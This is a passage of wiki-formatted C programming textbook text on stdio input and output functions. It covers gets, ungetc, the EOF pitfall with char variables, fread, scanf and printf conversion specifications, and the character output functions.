This function and description is only included here for completeness. Most C programmers nowadays shy away from using &lt;code&gt;gets&lt;/code&gt;, as there is no way for the function to know how big the buffer is that the programmer wants to read into. Commandment #5 of [[w:Henry Spencer | Henry Spencer]]'s ''The Ten Commandments for C Programmers (Annotated Edition)'' reads, &quot;Thou shalt check the array bounds of all strings (indeed, all arrays), for surely where thou typest ''foo'' someone someday shall type ''supercalifragilisticexpialidocious''.&quot; It mentions &lt;code&gt;gets&lt;/code&gt; in the annotation: &quot;As demonstrated by the deeds of the Great Worm, a consequence of this commandment is that robust production software should never make use of &lt;code&gt;gets()&lt;/code&gt;, for it is truly a tool of the Devil. Thy interfaces should always inform thy servants of the bounds of thy arrays, and servants who spurn such advice or quietly fail to follow it should be dispatched forthwith to the Land Of Rm, where they can do no further harm to thee.&quot;

====The &lt;code&gt;ungetc&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 int ungetc(int c, FILE *stream);

The &lt;code&gt;ungetc&lt;/code&gt; function pushes the character specified by &lt;code&gt;c&lt;/code&gt; (converted to an &lt;code&gt;unsigned char&lt;/code&gt;) back onto the input stream pointed to by stream. The pushed-back characters will be returned by subsequent reads on that stream in the reverse order of their pushing. A successful intervening call (with the stream pointed to by &lt;code&gt;stream&lt;/code&gt;) to a file-positioning function (&lt;code&gt;fseek&lt;/code&gt;, &lt;code&gt;fsetpos&lt;/code&gt;, or &lt;code&gt;rewind&lt;/code&gt;) discards any pushed-back characters for the stream. The external storage corresponding to the stream is unchanged.

One character of pushback is guaranteed. If the &lt;code&gt;ungetc&lt;/code&gt; function is called too many times on the same stream without an intervening read or file positioning operation on that stream, the operation may fail.

If the value of &lt;code&gt;c&lt;/code&gt; equals that of the macro &lt;code&gt;EOF&lt;/code&gt;, the operation fails and the input stream is unchanged.

A successful call to the &lt;code&gt;ungetc&lt;/code&gt; function clears the end-of-file indicator for the stream. The value of the file position indicator for the stream after reading or discarding all pushed-back characters shall be the same as it was before the characters were pushed back. For a text stream, the value of its file-position indicator after a successful call to the &lt;code&gt;ungetc&lt;/code&gt; function is unspecified until all pushed-back characters are read or discarded. For a binary stream, its file position indicator is decremented by each successful call to the &lt;code&gt;ungetc&lt;/code&gt; function; if its value was zero before a call, it is indeterminate after the call.

The &lt;code&gt;ungetc&lt;/code&gt; function returns the character pushed back after conversion, or &lt;code&gt;EOF&lt;/code&gt; if the operation fails.


===EOF pitfall===
A mistake when using &lt;code&gt;fgetc&lt;/code&gt;, &lt;code&gt;getc&lt;/code&gt;, or &lt;code&gt;getchar&lt;/code&gt; is to assign the result to a variable of type &lt;code&gt;char&lt;/code&gt; ''before'' comparing it to &lt;code&gt;EOF&lt;/code&gt;. The following code fragments exhibit this mistake, and then show the correct approach (using type int):

&lt;center&gt;
{| width=&quot;80%&quot; style=&quot;margin-left: auto; margin-right: auto; &quot;
! Mistake
! Correction
|-
|
&lt;source lang=&quot;c&quot;&gt;
char c;
while ((c = getchar()) != EOF)
    putchar(c);
&lt;/source&gt;
|
&lt;source lang=&quot;c&quot;&gt;
int c;
while ((c = getchar()) != EOF)
    putchar(c);
&lt;/source&gt;
|}
&lt;/center&gt;

Consider a system in which the type &lt;code&gt;char&lt;/code&gt; is 8&amp;nbsp;bits wide, representing 256&amp;nbsp;different values. &lt;code&gt;getchar&lt;/code&gt; may return any of the 256&amp;nbsp;possible characters, and it also may return &lt;code&gt;EOF&lt;/code&gt; to indicate [[end-of-file]], for a total of 257 different possible return values.

When &lt;code&gt;getchar&lt;/code&gt;'s result is assigned to a &lt;code&gt;char&lt;/code&gt;, which can represent only 256 different values, there is necessarily some loss of information—when packing 257&amp;nbsp;items into 256&amp;nbsp;slots, there [[Pigeonhole principle|must be a collision]]. The &lt;code&gt;EOF&lt;/code&gt; value, when converted to &lt;code&gt;char&lt;/code&gt;, becomes indistinguishable from whichever one of the 256 characters shares its numerical value. If that character is found in the file, the above example may mistake it for an end-of-file indicator; or, just as bad, if type &lt;code&gt;char&lt;/code&gt; is unsigned, then because &lt;code&gt;EOF&lt;/code&gt; is negative, it can never be equal to any unsigned &lt;code&gt;char&lt;/code&gt;, so the above example will not terminate at end-of-file. It will loop forever, repeatedly printing the character which results from converting &lt;code&gt;EOF&lt;/code&gt; to &lt;code&gt;char&lt;/code&gt;.

However, this looping failure mode does not occur if the char definition is signed (C makes the signedness of the default char type implementation-dependent),&lt;ref&gt;C99 §6.2.5/15&lt;/ref&gt;  assuming the commonly used [[End-of-file|&lt;code&gt;EOF&lt;/code&gt; value of -1]].  However, the fundamental issue remains that if the &lt;code&gt;EOF&lt;/code&gt; value is defined outside of the range of the &lt;code&gt;char&lt;/code&gt; type, when assigned to a &lt;code&gt;char&lt;/code&gt; that value is sliced and will no longer match the full &lt;code&gt;EOF&lt;/code&gt; value necessary to exit the loop.  On the other hand, if &lt;code&gt;EOF&lt;/code&gt; is within range of &lt;code&gt;char&lt;/code&gt;, this guarantees a collision between &lt;code&gt;EOF&lt;/code&gt; and a char value.  Thus, regardless of how system types are defined, never use &lt;code&gt;char&lt;/code&gt; types when testing against &lt;code&gt;EOF&lt;/code&gt;.

On systems where &lt;code&gt;int&lt;/code&gt; and &lt;code&gt;char&lt;/code&gt; are the same size (i.e., systems incompatible with minimally the POSIX and C99 standards), even the &quot;good&quot; example will suffer from the indistinguishability of &lt;code&gt;EOF&lt;/code&gt; and some character's value. The proper way to handle this situation is to check &lt;code&gt;[[feof]]&lt;/code&gt; and &lt;code&gt;[[ferror]]&lt;/code&gt; after &lt;code&gt;getchar&lt;/code&gt; returns &lt;code&gt;EOF&lt;/code&gt;. If &lt;code&gt;feof&lt;/code&gt; indicates that end-of-file has not been reached, and &lt;code&gt;ferror&lt;/code&gt; indicates that no errors have occurred, then the &lt;code&gt;EOF&lt;/code&gt; returned by &lt;code&gt;getchar&lt;/code&gt; can be assumed to represent an actual character. These extra checks are rarely done, because most programmers assume that their code will never need to run on one of these &quot;big &lt;code&gt;char&lt;/code&gt;&quot; systems. Another way is to use a compile-time assertion to make sure that &lt;code&gt;UINT_MAX &gt; UCHAR_MAX&lt;/code&gt;, which at least prevents a program with such an assumption from compiling in such a system.


===Direct input function: the &lt;code&gt;fread&lt;/code&gt; function===
 #include &lt;stdio.h&gt;
 size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);

The &lt;code&gt;fread&lt;/code&gt; function reads, into the array pointed to by &lt;code&gt;ptr&lt;/code&gt;, up to &lt;code&gt;nmemb&lt;/code&gt; elements whose size is specified by &lt;code&gt;size&lt;/code&gt;, from the stream pointed to by &lt;code&gt;stream&lt;/code&gt;. The file position indicator for the stream (if defined) is advanced by the number of characters successfully read. If an error occurs, the resulting value of the file position indicator for the stream is indeterminate. If a partial element is read, its value is indeterminate.

The &lt;code&gt;fread&lt;/code&gt; function returns the number of elements successfully read, which may be less than &lt;code&gt;nmemb&lt;/code&gt; if a read error or end-of-file is encountered. If &lt;code&gt;size&lt;/code&gt; or &lt;code&gt;nmemb&lt;/code&gt; is zero, &lt;code&gt;fread&lt;/code&gt; returns zero and the contents of the array and the state of the stream remain unchanged.

===Formatted input functions: the &lt;code&gt;scanf&lt;/code&gt; family of functions===
 #include &lt;stdio.h&gt;
 int fscanf(FILE *stream, const char *format, ...);
 int scanf(const char *format, ...);
 int sscanf(const char *s, const char *format, ...);

The &lt;code&gt;fscanf&lt;/code&gt; function reads input from the stream pointed to by &lt;code&gt;stream&lt;/code&gt;, under control of the string pointed to by &lt;code&gt;format&lt;/code&gt; that specifies the admissible sequences and how they are to be converted for assignment, using subsequent arguments as pointers to the objects to receive converted input. If there are insufficient arguments for the format, the behavior is undefined. If the format is exhausted while arguments remain, the excess arguments are evaluated (as always) but are otherwise ignored.

The format shall be a multibyte character sequence, beginning and ending in its initial shift state. The format is composed of zero or more directives: one or more white-space characters; an ordinary multibyte character (neither &lt;tt&gt;%&lt;/tt&gt; or a white-space character); or a conversion specification. Each conversion specification is introduced by the character &lt;tt&gt;%&lt;/tt&gt;. After the &lt;tt&gt;%&lt;/tt&gt;, the following appear in sequence:
*An optional assignment-suppressing character &lt;tt&gt;*&lt;/tt&gt;.
*An optional nonzero decimal integer that specifies the maximum field width.
*An optional &lt;tt&gt;h&lt;/tt&gt;, &lt;tt&gt;l&lt;/tt&gt; (ell) or &lt;tt&gt;L&lt;/tt&gt; indicating the size of the receiving object. The conversion specifiers &lt;tt&gt;d&lt;/tt&gt;, &lt;tt&gt;i&lt;/tt&gt;, and &lt;tt&gt;n&lt;/tt&gt; shall be preceded by &lt;tt&gt;h&lt;/tt&gt; if the corresponding argument is a pointer to &lt;code&gt;short int&lt;/code&gt; rather than a pointer to &lt;code&gt;int&lt;/code&gt;, or by &lt;tt&gt;l&lt;/tt&gt; if it is a pointer to &lt;code&gt;long int&lt;/code&gt;. Similarly, the conversion specifiers &lt;tt&gt;o&lt;/tt&gt;, &lt;tt&gt;u&lt;/tt&gt;, and &lt;tt&gt;x&lt;/tt&gt; shall be preceded by &lt;tt&gt;h&lt;/tt&gt; if the corresponding argument is a pointer to &lt;code&gt;unsigned short int&lt;/code&gt; rather than &lt;code&gt;unsigned int&lt;/code&gt;, or by &lt;tt&gt;l&lt;/tt&gt; if it is a pointer to &lt;code&gt;unsigned long int&lt;/code&gt;. Finally, the conversion specifiers &lt;tt&gt;e&lt;/tt&gt;, &lt;tt&gt;f&lt;/tt&gt;, and &lt;tt&gt;g&lt;/tt&gt; shall be preceded by &lt;tt&gt;l&lt;/tt&gt; if the corresponding argument is a pointer to &lt;code&gt;double&lt;/code&gt; rather than a pointer to &lt;code&gt;float&lt;/code&gt;, or by &lt;tt&gt;L&lt;/tt&gt; if it is a pointer to &lt;code&gt;long double&lt;/code&gt;. If an &lt;tt&gt;h&lt;/tt&gt;, &lt;tt&gt;l&lt;/tt&gt;, or &lt;tt&gt;L&lt;/tt&gt; appears with any other format specifier, the behavior is undefined.
*A character that specifies the type of conversion to be applied. The valid conversion specifiers are described below.

The &lt;code&gt;fscanf&lt;/code&gt; function executes each directive of the format in turn. If a directive fails, as detailed below, the &lt;code&gt;fscanf&lt;/code&gt; function returns. Failures are described as input failures (due to the unavailability of input characters) or matching failures (due to inappropriate input).

A directive composed of white-space character(s) is executed by reading input up to the first non-white-space character (which remains unread) or until no more characters remain unread.

A directive that is an ordinary multibyte character is executed by reading the next characters of the stream. If one of the characters differs from one comprising the directive, the directive fails, and the differing and subsequent characters remain unread.

A directive that is a conversion specification defines a set of matching input sequences, as described below for each specifier. A conversion specification is executed in the following steps:

Input white-space characters (as specified by the &lt;code&gt;isspace&lt;/code&gt; function) are skipped, unless the specification includes a &lt;tt&gt;[&lt;/tt&gt;, &lt;tt&gt;c&lt;/tt&gt;, or &lt;tt&gt;n&lt;/tt&gt; specifier. (The white-space characters are not counted against the specified field width.)

An input item is read from the stream, unless the specification includes an &lt;tt&gt;n&lt;/tt&gt; specifier. An input item is defined as the longest matching sequences of input characters, unless that exceeds a specified field width, in which case it is the initial subsequence of that length in the sequence. The first character, if any, after the input item remains unread. If the length of the input item is zero, the execution of the directive fails; this condition is a matching failure, unless an error prevented input from the stream, in which case it is an input failure.

Except in the case of a &lt;tt&gt;%&lt;/tt&gt; specifier, the input item (or, in the case of a &lt;tt&gt;%n&lt;/tt&gt; directive, the count of input characters) is converted to a type appropriate to the conversion specifier. If the input item is not a matching sequence, the execution of the directive fails; this condition is a matching failure. Unless assignment suppression was indicated by a &lt;tt&gt;*&lt;/tt&gt;, the result of the conversion is placed in the object pointed to by the first argument following the &lt;code&gt;format&lt;/code&gt; argument that has not already received a conversion result. If this object does not have an appropriate type, or if the result of the conversion cannot be represented in the space provided, the behavior is undefined.

The following conversion specifiers are valid:

; &lt;tt&gt;d&lt;/tt&gt; : Matches an optionally signed decimal integer, whose format is the same as expected for the subject sequence of the &lt;code&gt;strtol&lt;/code&gt; function with the value 10 for the &lt;code&gt;base&lt;/code&gt; argument. The corresponding argument shall be a pointer to integer.

; &lt;tt&gt;i&lt;/tt&gt; : Matches an optionally signed integer, whose format is the same as expected for the subject sequence of the &lt;code&gt;strtol&lt;/code&gt; function with the value 0 for the &lt;code&gt;base&lt;/code&gt; argument. The corresponding argument shall be a pointer to integer.

; &lt;tt&gt;o&lt;/tt&gt; : Matches an optionally signed octal integer, whose format is the same as expected for the subject sequence of the &lt;code&gt;strtoul&lt;/code&gt; function with the value 8 for the &lt;code&gt;base&lt;/code&gt; argument. The corresponding argument shall be a pointer to unsigned integer.

; &lt;tt&gt;u&lt;/tt&gt; : Matches an optionally signed decimal integer, whose format is the same as expected for the subject sequence of the &lt;code&gt;strtoul&lt;/code&gt; function with the value 10 for the &lt;code&gt;base&lt;/code&gt; argument. The corresponding argument shall be a pointer to unsigned integer.

; &lt;tt&gt;x&lt;/tt&gt; : Matches an optionally signed hexadecimal integer, whose format is the same as expected for the subject sequence of the &lt;code&gt;strtoul&lt;/code&gt; function with the value 16 for the &lt;code&gt;base&lt;/code&gt; argument. The corresponding argument shall be a pointer to unsigned integer.

; &lt;tt&gt;e&lt;/tt&gt;, &lt;tt&gt;f&lt;/tt&gt;, &lt;tt&gt;g&lt;/tt&gt; : Matches an optionally signed floating-point number, whose format is the same as expected for the subject string of the &lt;code&gt;strtod&lt;/code&gt; function. The corresponding argument will be a pointer to floating.

; &lt;tt&gt;s&lt;/tt&gt; : Matches a sequence of non-white-space characters. (No special provisions are made for multibyte characters.) The corresponding argument shall be a pointer to the initial character of an array large enough to accept the sequence and a terminating null character, which will be added automatically.

; &lt;tt&gt;[&lt;/tt&gt; : Matches a nonempty sequence of characters (no special provisions are made for multibyte characters) from a set of expected characters (the &lt;i&gt;scanset&lt;/i&gt;). The corresponding argument shall be a pointer to the initial character of an array large enough to accept the sequence and a terminating null character, which will be added automatically. The conversion specifier includes all subsequent characters in the &lt;code&gt;format&lt;/code&gt; string, up to and including the matching right bracket (&lt;tt&gt;]&lt;/tt&gt;). The characters between the brackets (the &lt;i&gt;scanlist&lt;/i&gt;) comprise the scanset, unless the character after the left bracket is a circumflex (&lt;tt&gt;^&lt;/tt&gt;), in which case the scanset contains all the characters that do not appear in the scanlist between the circumflex and the right bracket. If the conversion specifier begins with &lt;tt&gt;[]&lt;/tt&gt; or &lt;tt&gt;[^]&lt;/tt&gt;, the right-bracket character is in the scanlist and the next right bracket character is the matching right bracket that ends the specification; otherwise, the first right bracket character is the one that ends the specification. If a &lt;tt&gt;-&lt;tt&gt; character is in the scanlist and is not the first, nor the second where the first character is a &lt;tt&gt;^&lt;/tt&gt;, nor the last character, the behavior is implementation-defined.

; &lt;tt&gt;c&lt;/tt&gt; : Matches a sequence of characters (no special provisions are made for multibyte characters) of the number specified by the field width (1 if no field width is present in the directive). The corresponding argument shall be a pointer to the initial character of an array large enough to accept the sequence. No null character is added.

; &lt;tt&gt;p&lt;/tt&gt; : Matches an implementation-defined set of sequences, which should be the same as the set of sequences that may be produced by the &lt;tt&gt;%p&lt;/tt&gt; conversion of the &lt;code&gt;fprintf&lt;/code&gt; function. The corresponding argument shall be a pointer to &lt;code&gt;void&lt;/code&gt;. The interpretation of the input then is implementation-defined. If the input item is a value converted earlier during the same program execution, the pointer that results shall compare equal to that value; otherwise the behavior of the &lt;tt&gt;%p&lt;/tt&gt; conversion is undefined.

; &lt;tt&gt;n&lt;/tt&gt; : No input is consumed. The corresponding argument shall be a pointer to integer into which is to be written the number of characters read from the input stream so far by this call to the &lt;code&gt;fscanf&lt;/code&gt; function. Execution of a &lt;tt&gt;%n&lt;/tt&gt; directive does not increment the assignment count returned at the completion of execution of the &lt;code&gt;fscanf&lt;/code&gt; function.

; &lt;tt&gt;%&lt;/tt&gt; : Matches a single &lt;tt&gt;%&lt;/tt&gt;; no conversion or assignment occurs. The complete conversion specification shall be &lt;tt&gt;%%&lt;/tt&gt;.

If a conversion specification is invalid, the behavior is undefined.

The conversion specifiers &lt;tt&gt;E&lt;/tt&gt;, &lt;tt&gt;G&lt;/tt&gt;, and &lt;tt&gt;X&lt;/tt&gt; are also valid and behave the same as, respectively, &lt;tt&gt;e&lt;/tt&gt;, &lt;tt&gt;g&lt;/tt&gt;, and &lt;tt&gt;x&lt;/tt&gt;.

If end-of-file is encountered during input, conversion is terminated. If end-of-file occurs before any characters matching the current directive have been read (other than leading white space, where permitted), execution of the current directive terminates with an input failure; otherwise, unless execution of the current directive is terminated with a matching failure, execution of the following directive (if any) is terminated with an input failure.

If conversion terminates on a conflicting input character, the offending input character is left unread in the input stream. Trailing white space (including new-line characters) is left unread unless matched by a directive. The success of literal matches and suppressed assignments is not directly determinable other than via the &lt;tt&gt;%n&lt;/tt&gt; directive.

The &lt;code&gt;fscanf&lt;/code&gt; function returns the value of the macro &lt;code&gt;EOF&lt;/code&gt; if an input failure occurs before any conversion. Otherwise, the &lt;code&gt;fscanf&lt;/code&gt; function returns the number of input items assigned, which can be fewer than provided for, or even zero, in the event of an early matching failure.

The &lt;code&gt;scanf&lt;/code&gt; function is equivalent to &lt;code&gt;fscanf&lt;/code&gt; with the argument &lt;code&gt;stdin&lt;/code&gt; interposed before the arguments to &lt;code&gt;scanf&lt;/code&gt;. Its return value is similar to that of &lt;code&gt;fscanf&lt;/code&gt;.

The &lt;code&gt;sscanf&lt;/code&gt; function is equivalent to &lt;code&gt;fscanf&lt;/code&gt;, except that the argument &lt;code&gt;s&lt;/code&gt; specifies a string from which the input is to be obtained, rather than from a stream. Reaching the end of the string is equivalent to encountering the end-of-file for the &lt;code&gt;fscanf&lt;/code&gt; function. If copying takes place between objects that overlap, the behavior is undefined.

==Writing to Files==
===Character Output Functions===
====The &lt;code&gt;fputc&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 int fputc(int c, FILE *stream);

The &lt;code&gt;fputc&lt;/code&gt; function writes the character specified by &lt;code&gt;c&lt;/code&gt; (converted to an &lt;code&gt;unsigned char&lt;/code&gt;) to the stream pointed to by &lt;code&gt;stream&lt;/code&gt; at the position indicated by the associated file position indicator (if defined), and advances the indicator appropriately. If the file cannot support positioning requests, or if the stream is opened with append mode, the character is appended to the output stream. The function returns the character written, unless a write error occurs, in which case the error indicator for the stream is set and &lt;code&gt;fputc&lt;/code&gt; returns &lt;code&gt;EOF&lt;/code&gt;.

====The &lt;code&gt;fputs&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 int fputs(const char *s, FILE *stream);

The &lt;code&gt;fputs&lt;/code&gt; function writes the string pointed to by &lt;code&gt;s&lt;/code&gt; to the stream pointed to by &lt;code&gt;stream&lt;/code&gt;. The terminating null character is not written. The function returns &lt;code&gt;EOF&lt;/code&gt; if a write error occurs, otherwise it returns a nonnegative value.

====The &lt;code&gt;putc&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 int putc(int c, FILE *stream);

The &lt;code&gt;putc&lt;/code&gt; function is equivalent to &lt;code&gt;fputc&lt;/code&gt;, except that if it is implemented as a macro, it may evaluate &lt;code&gt;stream&lt;/code&gt; more than once, so the argument should never be an expression with side effects. The function returns the character written, unless a write error occurs, in which case the error indicator for the stream is set and the function returns &lt;code&gt;EOF&lt;/code&gt;.

====The &lt;code&gt;putchar&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 int putchar(int c);

The &lt;code&gt;putchar&lt;/code&gt; function is equivalent to &lt;code&gt;putc&lt;/code&gt; with the second argument &lt;code&gt;stdout&lt;/code&gt;. It returns the character written, unless a write error occurs, in which case the error indicator for &lt;code&gt;stdout&lt;/code&gt; is set and the function returns &lt;code&gt;EOF&lt;/code&gt;.

====The &lt;code&gt;puts&lt;/code&gt; function====
 #include &lt;stdio.h&gt;
 int puts(const char *s);

The &lt;code&gt;puts&lt;/code&gt; function writes the string pointed to by &lt;code&gt;s&lt;/code&gt; to the stream pointed to by &lt;code&gt;stdout&lt;/code&gt;, and appends a new-line character to the output. The terminating null character is not written. The function returns &lt;code&gt;EOF&lt;/code&gt; if a write error occurs; otherwise, it returns a nonnegative value.

===Direct output function: the &lt;code&gt;fwrite&lt;/code&gt; function===
 #include &lt;stdio.h&gt;
 size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream);

The &lt;code&gt;fwrite&lt;/code&gt; function writes, from the array pointed to by &lt;code&gt;ptr&lt;/code&gt;, up to &lt;code&gt;nmemb&lt;/code&gt; elements whose size is specified by &lt;code&gt;size&lt;/code&gt; to the stream pointed to by &lt;code&gt;stream&lt;/code&gt;. The file position indicator for the stream (if defined) is advanced by the number of characters successfully written. If an error occurs, the resulting value of the file position indicator for the stream is indeterminate. The function returns the number of elements successfully written, which will be less than &lt;code&gt;nmemb&lt;/code&gt; only if a write error is encountered.

===Formatted output functions: the &lt;code&gt;printf&lt;/code&gt; family of functions===
 #include &lt;stdarg.h&gt;
 #include &lt;stdio.h&gt;
 int fprintf(FILE *stream, const char *format, ...);
 int printf(const char *format, ...);
 int sprintf(char *s, const char *format, ...);
 int vfprintf(FILE *stream, const char *format, va_list arg);
 int vprintf(const char *format, va_list arg);
 int vsprintf(char *s, const char *format, va_list arg);

''Note: Some length specifiers and format specifiers are new in C99. These may not be available in older compilers and versions of the stdio library, which adhere to the C89/C90 standard. Wherever possible, the new ones will be marked with (C99).''

The &lt;code&gt;fprintf&lt;/code&gt; function writes output to the stream pointed to by &lt;code&gt;stream&lt;/code&gt; under control of the string pointed to by &lt;code&gt;format&lt;/code&gt; that specifies how subsequent arguments are converted for output. If there are insufficient arguments for the format, the behavior is
undefined. If the format is exhausted while arguments remain, the excess arguments are evaluated (as always) but are otherwise ignored. The &lt;code&gt;fprintf &lt;/code&gt; function returns when the end of the format string is encountered.

The format shall be a multibyte character sequence, beginning and ending in its initial shift state. The format is composed of zero or more directives: ordinary multibyte characters (not &lt;tt&gt;%&lt;/tt&gt;), which are copied unchanged to the output stream; and conversion specifications, each of which results in fetching zero or more subsequent arguments, converting them, if applicable, according to the corresponding conversion specifier, and then writing the result to the output stream.

Each conversion specification is introduced by the character &lt;tt&gt;%&lt;/tt&gt;. After the &lt;tt&gt;%&lt;/tt&gt;, the following appear in sequence:

* Zero or more flags (in any order) that modify the meaning of the conversion specification.
* An optional minimum field width. If the converted value has fewer characters than the field width, it is padded with spaces (by default) on the left (or right, if the left adjustment flag, described later, has been given) to the field width. The field width takes the form of an asterisk &lt;tt&gt;*&lt;/tt&gt; (described later) or a decimal integer. (Note that 0 is taken as a flag, not as the beginning of a field width.)
*An optional precision that gives the minimum number of digits to appear for the &lt;tt&gt;d&lt;/tt&gt;, &lt;tt&gt;i&lt;/tt&gt;, &lt;tt&gt;o&lt;/tt&gt;, &lt;tt&gt;u&lt;/tt&gt;, &lt;tt&gt;x&lt;/tt&gt;, and &lt;tt&gt;X&lt;/tt&gt; conversions, the number of digits to appear after the decimal-point character for &lt;tt&gt;a&lt;/tt&gt;, &lt;tt&gt;A&lt;/tt&gt;, &lt;tt&gt;e&lt;/tt&gt;, &lt;tt&gt;E&lt;/tt&gt;, &lt;tt&gt;f&lt;/tt&gt;, and &lt;tt&gt;F&lt;/tt&gt; conversions, the maximum number of significant digits for the &lt;tt&gt;g&lt;/tt&gt; and &lt;tt&gt;G&lt;/tt&gt; conversions, or the maximum number of characters to be written from a string in &lt;tt&gt;s&lt;/tt&gt; conversions. The precision takes the form of a period (&lt;tt&gt;.&lt;/tt&gt;) followed either by an asterisk &lt;tt&gt;*&lt;/tt&gt; (described later) or by an optional decimal integer; if only the period is specified, the precision is taken as zero. If a precision appears with any other conversion specifier, the behavior is undefined. Floating-point numbers are ''rounded'' to fit the precision; i.e. &lt;tt&gt;printf(&quot;%1.1f\n&quot;, 1.19);&lt;/tt&gt; produces &lt;tt&gt;1.2&lt;/tt&gt;.
* An optional length modifier that specifies the size of the argument.
* A conversion specifier character that specifies the type of conversion to be applied.

As noted above, a field width, or precision, or both, may be indicated by an asterisk. In this case, an &lt;code&gt;int&lt;/code&gt; argument supplies the field width or precision. The arguments specifying field width, or precision, or both, shall appear (in that order) before the argument (if any) to be converted. A negative field width argument is taken as a &lt;tt&gt;-&lt;/tt&gt; flag followed by a positive field width. A negative precision argument is taken as if the precision were omitted.

The flag characters and their meanings are:
; &lt;tt&gt;-&lt;/tt&gt; : The result of the conversion is left-justified within the field. (It is right-justified if this flag is not specified.)
; &lt;tt&gt;+&lt;/tt&gt; : The result of a signed conversion always begins with a plus or minus sign. (It begins with a sign only when a negative value is converted if this flag is not specified. The results of all floating conversions of a negative zero, and of negative values that round to zero, include a minus sign.)
; &lt;i&gt;space&lt;/i&gt; : If the first character of a signed conversion is not a sign, or if a signed conversion results in no characters, a space is prefixed to the result. If the space and &lt;tt&gt;+&lt;/tt&gt; flags both appear, the space flag is ignored.
; &lt;tt&gt;#&lt;/tt&gt; : The result is converted to an &quot;alternative form&quot;. For &lt;tt&gt;o&lt;/tt&gt; conversion, it increases the precision, if and only if necessary, to force the first digit of the result to be a zero (if the value and precision are both 0, a single 0 is printed). For &lt;tt&gt;x&lt;/tt&gt; (or &lt;tt&gt;X&lt;/tt&gt;) conversion, a nonzero result has &lt;tt&gt;0x&lt;/tt&gt; (or &lt;tt&gt;0X&lt;/tt&gt;) prefixed to it. For &lt;tt&gt;a&lt;/tt&gt;, &lt;tt&gt;A&lt;/tt&gt;, &lt;tt&gt;e&lt;/tt&gt;, &lt;tt&gt;E&lt;/tt&gt;, &lt;tt&gt;f&lt;/tt&gt;, &lt;tt&gt;F&lt;/tt&gt;, &lt;tt&gt;g&lt;/tt&gt;, and &lt;tt&gt;G&lt;/tt&gt; conversions, the result always contains a decimal-point character, even if no digits follow it. (Normally, a decimal-point character appears in the result of these conversions only if a digit follows it.) For &lt;tt&gt;g&lt;/tt&gt; and &lt;tt&gt;G&lt;/tt&gt; conversions, trailing zeros are not removed from the result. For other conversions, the behavior is undefined.
; &lt;tt&gt;0&lt;/tt&gt; : For &lt;tt&gt;d&lt;/tt&gt;, &lt;tt&gt;i&lt;/tt&gt;, &lt;tt&gt;o&lt;/tt&gt;, &lt;tt&gt;u&lt;/tt&gt;, &lt;tt&gt;x&lt;/tt&gt;, &lt;tt&gt;X&lt;/tt&gt;, &lt;tt&gt;a&lt;/tt&gt;, &lt;tt&gt;A&lt;/tt&gt;, &lt;tt&gt;e&lt;/tt&gt;, &lt;tt&gt;E&lt;/tt&gt;, &lt;tt&gt;f&lt;/tt&gt;, &lt;tt&gt;F&lt;/tt&gt;, &lt;tt&gt;g&lt;/tt&gt;, and &lt;tt&gt;G&lt;/tt&gt; conversions, leading zeros (following any indication of sign or base) are used to pad to the field width; no space padding is performed. If the &lt;tt&gt;0&lt;/tt&gt; and &lt;tt&gt;-&lt;/tt&gt; flags both appear, the &lt;tt&gt;0&lt;/tt&gt; flag is ignored. For &lt;tt&gt;d&lt;/tt&gt;, &lt;tt&gt;i&lt;/tt&gt;, &lt;tt&gt;o&lt;/tt&gt;, &lt;tt&gt;u&lt;/tt&gt;, &lt;tt&gt;x&lt;/tt&gt;, and &lt;tt&gt;X&lt;/tt&gt; conversions, if a precision is specified, the &lt;tt&gt;0&lt;/tt&gt; flag is ignored. For other conversions, the behavior is undefined.

The length modifiers and their meanings are:

; &lt;tt&gt;t&lt;/tt&gt; : (C99) Specifies that a following &lt;tt&gt;d&lt;/tt&gt;, &lt;tt&gt;i&lt;/tt&gt;, &lt;tt&gt;o&lt;/tt&gt;, &lt;tt&gt;u&lt;/tt&gt;, &lt;tt&gt;x&lt;/tt&gt;, or &lt;tt&gt;X&lt;/tt&gt; conversion specifier applies to a &lt;code&gt;ptrdiff_t&lt;/code&gt; or the corresponding unsigned integer type argument; or that a following &lt;tt&gt;n&lt;/tt&gt; conversion specifier applies to a pointer to a &lt;code&gt;ptrdiff_t&lt;/code&gt; argument.

; &lt;tt&gt;L&lt;/tt&gt; : Specifies that a following &lt;tt&gt;a&lt;/tt&gt;, &lt;tt&gt;A&lt;/tt&gt;, &lt;tt&gt;e&lt;/tt&gt;, &lt;tt&gt;E&lt;/tt&gt;, &lt;tt&gt;f&lt;/tt&gt;, &lt;tt&gt;F&lt;/tt&gt;, &lt;tt&gt;g&lt;/tt&gt;, or &lt;tt&gt;G&lt;/tt&gt; conversion specifier applies to a &lt;code&gt;long double&lt;/code&gt; argument.

If a length modifier appears with any conversion specifier other than as specified above, the behavior is undefined.

The conversion specifiers and their meanings are:

; &lt;tt&gt;d&lt;/tt&gt;, &lt;tt&gt;i&lt;/tt&gt; : The &lt;code&gt;int&lt;/code&gt; argument is converted to signed decimal in the style &lt;i&gt;[&lt;/i&gt;&lt;tt&gt;&lt;b&gt;−&lt;/b&gt;&lt;/tt&gt;&lt;i&gt;]dddd&lt;/i&gt;. The precision specifies the minimum number of digits to appear; if the value being converted can be represented in fewer digits, it is expanded with leading zeros. The default precision is 1. The result of converting a zero value with a precision of zero is no characters.

